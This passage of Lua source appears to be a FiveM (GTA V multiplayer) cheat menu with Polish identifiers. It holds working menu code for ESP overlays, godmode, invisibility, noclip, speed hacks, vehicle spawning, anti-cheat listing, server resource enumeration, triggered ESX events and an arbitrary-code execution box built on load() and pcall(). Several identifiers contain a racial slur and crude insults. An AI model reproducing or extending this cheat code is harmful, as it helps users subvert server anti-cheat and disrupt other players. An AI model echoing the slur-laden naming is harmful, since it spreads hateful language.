				blipygraczy31qda_PN = Wlaczone_PN_MENU_E1QDA_XD
				end)
			then
		elseif checkbox_PN_31DA_PN(
			"~g~Force Radar",
			DISPLEJRADER31QC_PN,
			function(Wlaczone_PN_MENU_E1QDA_XD)
				DISPLEJRADER31QC_PN = Wlaczone_PN_MENU_E1QDA_XD
				end)
			then
		elseif checkbox_PN_31DA_PN(
            "~p~BEST ~r~ > ~s~ Crosshair",
            cejlowin_1_anteksuck_PN,
            function(Wlaczone_PN_MENU_E1QDA_XD)
				cejlowin_1_anteksuck_PN = Wlaczone_PN_MENU_E1QDA_XD
                end)
			then
		elseif checkbox_PN_31DA_PN(
				"~g~DOT ~r~ > ~s~ Crosshair",
				cejlowin_2_anteksuck_PN,
				function(Wlaczone_PN_MENU_E1QDA_XD)
					cejlowin_2_anteksuck_PN = Wlaczone_PN_MENU_E1QDA_XD
					end)
				then
		elseif checkbox_PN_31DA_PN(
            "~g~LEGIT ~r~ > ~s~ Force third person",
            tszeciaosobka13_31_PN,
            function(Wlaczone_PN_MENU_E1QDA_XD)
				tszeciaosobka13_31_PN = Wlaczone_PN_MENU_E1QDA_XD
                end)
			then
		elseif checkbox_PN_31DA_PN(
            "~g~LEGIT ~r~ > ~s~ Force DriveBy",
            drajfbaj31_3_PN,
            function(Wlaczone_PN_MENU_E1QDA_XD)
				drajfbaj31_3_PN = Wlaczone_PN_MENU_E1QDA_XD
                end)
			then
			end
			
			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('ESP_MENU_DUHFIDSUGHUIDFG') then
		if checkbox_PN_31DA_PN(
            "~p~ESP ~r~ > ~s~ ESP ~g~Turn ON",
            esp_duhsgiudfgdfg,
            function(Wlaczone_PN_MENU_E1QDA_XD)
				esp_duhsgiudfgdfg = Wlaczone_PN_MENU_E1QDA_XD
                end)
			then
		elseif checkbox_PN_31DA_PN(
            "~p~ESP ~r~ > ~s~ ESP Info",
            espinfo_ihfdsoudgifgdfg,
            function(Wlaczone_PN_MENU_E1QDA_XD)
				espinfo_ihfdsoudgifgdfg = Wlaczone_PN_MENU_E1QDA_XD
                end)
			then
		elseif checkbox_PN_31DA_PN(
            "~p~ESP ~r~ > ~s~ ESP Lines",
            esplines_IDSUHGIUFDHGUDFHIG,
            function(Wlaczone_PN_MENU_E1QDA_XD)
				esplines_IDSUHGIUFDHGUDFHIG = Wlaczone_PN_MENU_E1QDA_XD
                end)
			then
		elseif checkbox_PN_31DA_PN(
            "~p~ESP ~r~ > ~s~ ESP Box",
            espbox_dsuhfisdugsdfg,
            function(Wlaczone_PN_MENU_E1QDA_XD)
				espbox_dsuhfisdugsdfg = Wlaczone_PN_MENU_E1QDA_XD
                end)
			then
		elseif checkbox_PN_31DA_PN(
            "~p~ESP ~r~ > ~s~ Name above head",
            nameabove_duhsgsiudgsdgrdf,
            function(Wlaczone_PN_MENU_E1QDA_XD)
				nameabove_duhsgsiudgsdgrdf = Wlaczone_PN_MENU_E1QDA_XD
                end)
			then
		end

			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('Pogodadlaeqda_PN') then
			if pszycisk31eqd_PN("~b~LOCAL ~r~ > ~s~ XMAS") then
				sritizen_INVOKE_PN(0x704983DF373B198F, "XMAS") 
				sritizen_INVOKE_PN(0xED712CA327900C8A, "XMAS") 
				sritizen_INVOKE_PN(0x29B487C359E19889, "XMAS") 
				sritizen_INVOKE_PN(0xA43D5C6FE51ADBEF, "XMAS") 
			elseif pszycisk31eqd_PN("~b~LOCAL ~r~ > ~s~ EXTRASUNNY") then
				sritizen_INVOKE_PN(0x704983DF373B198F, "EXTRASUNNY") 
				sritizen_INVOKE_PN(0xED712CA327900C8A, "EXTRASUNNY") 
				sritizen_INVOKE_PN(0x29B487C359E19889, "EXTRASUNNY") 
				sritizen_INVOKE_PN(0xA43D5C6FE51ADBEF, "EXTRASUNNY") 
			elseif pszycisk31eqd_PN("~b~LOCAL ~r~ > ~s~ Set time to day") then
				sritizen_INVOKE_PN(0xE679E3E06E363892, 12, 0, 0) 
			end
			
		    displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('OpcjeServerowecac_PN') then
		if menibutton_PN938D_PN("Anty-Cheats", 'Anticzitys41qda_PN') then
		elseif menibutton_PN938D_PN("Scripts", 'skrypt_dla_niggerow_EDA_PN') then
		elseif pszycisk31eqd_PN("~p~50/50 ~r~ > ~s~ Execute custom lua code") then
		local code_to_execute_diushdgiosg = klawiaturainput419r8q_PN("Type code to execute", "", 99999999)
		local code_to_pcall_dihsgiuhfgisldugdf = load(code_to_execute_diushdgiosg)
		pcall(code_to_pcall_dihsgiuhfgisldugdf)
		end
		
		    displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('skrypt_dla_niggerow_EDA_PN') then
		for i_dihgiseuorg43dfg=1, GetNumResources_PN_DUSGUFFHIDGIDFG() do
		local skrypt_nigger_DSUIGHSIDUGHIUDS = GetResourceByFindIndex_PN_DSUGHIUDSHIUFDGDF(i_dihgiseuorg43dfg)
		if skrypt_nigger_DSUIGHSIDUGHIUDS==nil then
		elseif skrypt_nigger_DSUIGHSIDUGHIUDS=="_cfx_internal"then
		else
		if pszycisk31eqd_PN(skrypt_nigger_DSUIGHSIDUGHIUDS) then 
		JEBNIJpowiadomieni31_PN("~g~".. skrypt_nigger_DSUIGHSIDUGHIUDS)
		end
		end
		end
			
		    displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('Anticzitys41qda_PN') then
		if #AntyCheats_duhgw894ghwo34gdfsg == 0 then
		if pszycisk31eqd_PN("Not found") then end
		else
		for i_dihgiseuorg43dfg=1, #AntyCheats_duhgw894ghwo34gdfsg do
            if pszycisk31eqd_PN(AntyCheats_duhgw894ghwo34gdfsg[i_dihgiseuorg43dfg]) then
			   end
            end
	    end
			
		    displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('MenuPojazdu31qda_PN') then
		if menibutton_PN938D_PN("Spawn Options", "RESPIENIEVEHICLESOW_PN") then
		elseif pszycisk31eqd_PN("Spawn custom car") then
		local nazwapojazdu6996_PN = klawiaturainput419r8q_PN("Type a name of vehicle", "", 100)
		local Auteczko31_PN = sritizen_INVOKE_PN(0xD24D37CC275948CC, nazwapojazdu6996_PN)
        if nazwapojazdu6996_PN and sritizen_INVOKE_PN(0xC0296A2EDF545E92, Auteczko31_PN) and sritizen_INVOKE_PN(0x19AAC8F07BFEC53E, Auteczko31_PN) then
		RequestModelSync_SDUFHSIDGSDG(Auteczko31_PN)
		
		if usun_danypojazdek15987q_PN then
		local veh_DSGUHSDIUGSDUGSDGSDG = GetVehiclePedIsIn_PN_IDHUFYUHSUDGFD(sritizen_INVOKE_PN(0xD80958FC74E988A6), 0)
		sritizen_INVOKE_PN(0xEA386986E786A54F, Citizen.PointerValueIntInitialized(veh_DSGUHSDIUGSDUGSDGSDG))
		end

        local pojazd_410941_PN = sritizen_INVOKE_PN(0xAF35D0D2583051B0, sritizen_INVOKE_PN(0xD24D37CC275948CC, nazwapojazdu6996_PN), GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0xD80958FC74E988A6)), sritizen_INVOKE_PN(0xE83D4F9BA2A38914, sritizen_INVOKE_PN(0xD80958FC74E988A6)), true, true)
		if spawnowaniewpojezdzie31151_PN then
        sritizen_INVOKE_PN(0xF75B0D629E1C063D, sritizen_INVOKE_PN(0xD80958FC74E988A6), pojazd_410941_PN, -1)
		end
            else
        JEBNIJpowiadomieni31_PN("Model Not Found!")
			end
			elseif pszycisk31eqd_PN("Spawn Flying Plane!") then
            CZLOWIEKANDANTEKSUCK31QDA_PN()
		elseif Slider_dghiuergsergerg("Vehicle Actions", {"Repair", "Repair Engine", "Flip", "Delete"}, danaakcyjka3151_PN, function(UYDIIDFYGDIUFHIGDFG)
            danaakcyjka3151_PN = UYDIIDFYGDIUFHIGDFG
		end) then
		if danaakcyjka3151_PN == 1 then
		sritizen_INVOKE_PN(0x115722B1B9C14C1C, sritizen_INVOKE_PN(0x9A9112A0FE9A4713, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), false))
        sritizen_INVOKE_PN(0x79D3B596FE44EE8B, sritizen_INVOKE_PN(0x9A9112A0FE9A4713, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), false), 0.0)
        sritizen_INVOKE_PN(0x34E710FF01247C5A, sritizen_INVOKE_PN(0x9A9112A0FE9A4713, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), false), 0)
        sritizen_INVOKE_PN(0xFB8794444A7D60FB, sritizen_INVOKE_PN(0x9A9112A0FE9A4713, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), false), false)
        sritizen_INVOKE_PN(0x1FD09E7390A74D54, sritizen_INVOKE_PN(0x9A9112A0FE9A4713, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), false), 0)
		elseif danaakcyjka3151_PN == 2 then
		sritizen_INVOKE_PN(0x45F6D8EEF34ABEF1, GetVehiclePedIsIn_PN_IDHUFYUHSUDGFD(sritizen_INVOKE_PN(0x43A66C31C68491C0, -1)), 10000)
        sritizen_INVOKE_PN(0x1FD09E7390A74D54, GetVehiclePedIsIn_PN_IDHUFYUHSUDGFD(sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), false), 0)
        sritizen_INVOKE_PN(0x8ABA6AF54B942B95, GetVehiclePedIsIn_PN_IDHUFYUHSUDGFD(sritizen_INVOKE_PN(0x43A66C31C68491C0, -1)), false)
		sritizen_INVOKE_PN(0xFB8794444A7D60FB, GetVehiclePedIsIn_PN_IDHUFYUHSUDGFD(sritizen_INVOKE_PN(0x43A66C31C68491C0, -1)), false)
		elseif danaakcyjka3151_PN == 3 then
		local pojazd5917519q57_PN = sritizen_INVOKE_PN(0x6094AD011A2EA87D, sritizen_INVOKE_PN(0xD80958FC74E988A6))
		sritizen_INVOKE_PN(0x49733E92263139D1, pojazd5917519q57_PN)
		elseif danaakcyjka3151_PN == 4 then
		local pojazd5917519q57_PN = sritizen_INVOKE_PN(0x6094AD011A2EA87D, sritizen_INVOKE_PN(0xD80958FC74E988A6))
		sritizen_INVOKE_PN(0xAD738C3085FE7E11, pojazd5917519q57_PN, true, true)
		sritizen_INVOKE_PN(0xEA386986E786A54F, Citizen.PointerValueIntInitialized(pojazd5917519q57_PN))
		end
		elseif pszycisk31eqd_PN("Max Tuning") then
		local pojazd5917519q57_PN = sritizen_INVOKE_PN(0x6094AD011A2EA87D, sritizen_INVOKE_PN(0xD80958FC74E988A6))
		fulltjuningjestemjebanymjanuszem31_PN(pojazd5917519q57_PN)
		elseif pszycisk31eqd_PN("Max Mechanics") then
		local pojazd5917519q57_PN = sritizen_INVOKE_PN(0x6094AD011A2EA87D, sritizen_INVOKE_PN(0xD80958FC74E988A6))
		MAKSYMALNYTHJUNINGPERMOMENCE31_PN(pojazd5917519q57_PN)
		elseif checkbox_PN_31DA_PN(
			"~r~R~g~a~b~i~p~n~y~b~o~o~r~w ~s~Vehicle",
			kolorowypojazd14rq_PN,
			function(Wlaczone_PN_MENU_E1QDA_XD)
				kolorowypojazd14rq_PN = Wlaczone_PN_MENU_E1QDA_XD
				end)
			then
		elseif checkbox_PN_31DA_PN(
			"Vehicle Godmode",
			niezniszcalnypojazdbojestkox341q_PN,
			function(Wlaczone_PN_MENU_E1QDA_XD)
				niezniszcalnypojazdbojestkox341q_PN = Wlaczone_PN_MENU_E1QDA_XD
				end)
			then
		elseif checkbox_PN_31DA_PN(
			"Speed Boost",
			spidbuust31q_PN,
			function(Wlaczone_PN_MENU_E1QDA_XD)
				spidbuust31q_PN = Wlaczone_PN_MENU_E1QDA_XD
				end)
			then
			elseif checkbox_PN_31DA_PN(
			"Magic Carpet",
			medzikkarpet3109ad_PN,
			function(Wlaczone_PN_MENU_E1QDA_XD)
				medzikkarpet3109ad_PN = Wlaczone_PN_MENU_E1QDA_XD
				end)
			then
	end
		
		    displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('RESPIENIEVEHICLESOW_PN') then
		if checkbox_PN_31DA_PN(
			"Spawn in vehicle",
			spawnowaniewpojezdzie31151_PN,
			function(Wlaczone_PN_MENU_E1QDA_XD)
				spawnowaniewpojezdzie31151_PN = Wlaczone_PN_MENU_E1QDA_XD
				end)
			then
		elseif checkbox_PN_31DA_PN(
			"Delete current vehicle",
			usun_danypojazdek15987q_PN,
			function(Wlaczone_PN_MENU_E1QDA_XD)
				usun_danypojazdek15987q_PN = Wlaczone_PN_MENU_E1QDA_XD
				end)
			then
			end
			
		    displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('SelfMeni_31DA_PN') then
		if menibutton_PN938D_PN('Super Powers', 'Supermoce_31da_PN') then
		elseif menibutton_PN938D_PN('Outfit Menu', 'Ubior_31d3EDQA_PN') then
		elseif menibutton_PN938D_PN('Peds Menu', 'Peddddyyy_31DA_PN') then
		elseif checkbox_PN_31DA_PN(
			"GodMode",
			godmodetank_jebany_PN,
			function(Wlaczone_PN_MENU_E1QDA_XD)
				godmodetank_jebany_PN = Wlaczone_PN_MENU_E1QDA_XD
				end)
			then
			
			--medzikkarpet3109ad_PN
			elseif pszycisk31eqd_PN("Open Skin Menu", "ESX") then
				TriggerEvent('esx_skin:openSaveableMenu')
		elseif checkbox_PN_31DA_PN(
			"Invisible",
			Niewidka31da_PN,
			function(Wlaczone_PN_MENU_E1QDA_XD)
				Niewidka31da_PN = Wlaczone_PN_MENU_E1QDA_XD
				end)
			then
		elseif checkbox_PN_31DA_PN(
			"Reveal Invisible Players",
			Nie_Ukryjeszsiekurwo_MALA_PN,
			function(Wlaczone_PN_MENU_E1QDA_XD)
				Nie_Ukryjeszsiekurwo_MALA_PN = Wlaczone_PN_MENU_E1QDA_XD
				end)
			then
		    elseif checkbox_PN_31DA_PN(
            "Infinity Stamina",
            NIESKONCZONASTAMINKA_PN,
            function(Wlaczone_PN_MENU_E1QDA_XD)
            NIESKONCZONASTAMINKA_PN = Wlaczone_PN_MENU_E1QDA_XD
                end)
			then
			elseif pszycisk31eqd_PN("Suicide", "Native") then
			sritizen_INVOKE_PN(0x6B76DC1F3AE6E6A3, sritizen_INVOKE_PN(0xD80958FC74E988A6), 0)
			elseif pszycisk31eqd_PN("Revive", "Native") then
			PN_Revive_Native_XDIHFUDUSIFOSDFSDF()
			JEBNIJpowiadomieni31_PN("Revived!")
			elseif pszycisk31eqd_PN("Max ~g~Health", "Native") then
				sritizen_INVOKE_PN(0x6B76DC1F3AE6E6A3, sritizen_INVOKE_PN(0xD80958FC74E988A6), 200)
			elseif pszycisk31eqd_PN("Max ~b~Armour", "Native") then
				sritizen_INVOKE_PN(0xCEA04D83135264CC, sritizen_INVOKE_PN(0xD80958FC74E988A6), 100)
			elseif pszycisk31eqd_PN("Set ~o~hunger ~s~to ~g~100%", "ESX") then
				TriggerEvent("esx_status:set", "hunger", 1000000)
			elseif pszycisk31eqd_PN("Set ~b~thirst ~s~to ~g~100%", "ESX") then
				TriggerEvent("esx_status:set", "thirst", 1000000)
			elseif Slider_dghiuergsergerg('Fastrun', { "0%", "20%", "40%", "60%", "80%", "100%"}, SZYBKIBIEG_31QDZ_PN, function(currentIndex_ale_mozesz_mi_possac)
				SZYBKIBIEG_31QDZ_PN = currentIndex_ale_mozesz_mi_possac
				if SZYBKIBIEG_31QDZ_PN==1 then
				sritizen_INVOKE_PN(0x6DB47AA77FD94E09, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), 1.0)
				sritizen_INVOKE_PN(0x085BF80FA50A39D1, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), 1.0)
				elseif SZYBKIBIEG_31QDZ_PN==2 then
				sritizen_INVOKE_PN(0x6DB47AA77FD94E09, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), 1.09)
				sritizen_INVOKE_PN(0x085BF80FA50A39D1, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), 1.09)
				elseif SZYBKIBIEG_31QDZ_PN==3 then
				sritizen_INVOKE_PN(0x6DB47AA77FD94E09, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), 1.19)
				sritizen_INVOKE_PN(0x085BF80FA50A39D1, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), 1.19)
				elseif SZYBKIBIEG_31QDZ_PN==4 then
				sritizen_INVOKE_PN(0x6DB47AA77FD94E09, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), 1.29)
				sritizen_INVOKE_PN(0x085BF80FA50A39D1, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), 1.29)
				elseif SZYBKIBIEG_31QDZ_PN==5 then
				sritizen_INVOKE_PN(0x6DB47AA77FD94E09, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), 1.39)
				sritizen_INVOKE_PN(0x085BF80FA50A39D1, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), 1.39)
				elseif SZYBKIBIEG_31QDZ_PN==6 then
				sritizen_INVOKE_PN(0x6DB47AA77FD94E09, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), 1.49)
				sritizen_INVOKE_PN(0x085BF80FA50A39D1, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), 1.49)
				end
			end) then
			elseif checkbox_PN_31DA_PN(
				"Noclip",
				Noclip31eqd_PN,
				function(Wlaczone_PN_MENU_E1QDA_XD)
					Noclip31eqd_PN = Wlaczone_PN_MENU_E1QDA_XD
					end)
				then
			end





			displej31eqda_PN()
		elseif sritizen_INVOKE_PN(0x91AEF906BCA88877, 0, 10) then -- DELETE
			OpenMenu_eytfyuagbfhkjsdgergd('MejnMenuBajbas_PN')
		end

		PN_WAIT_31DA31_PN(0)
		
	end
end)
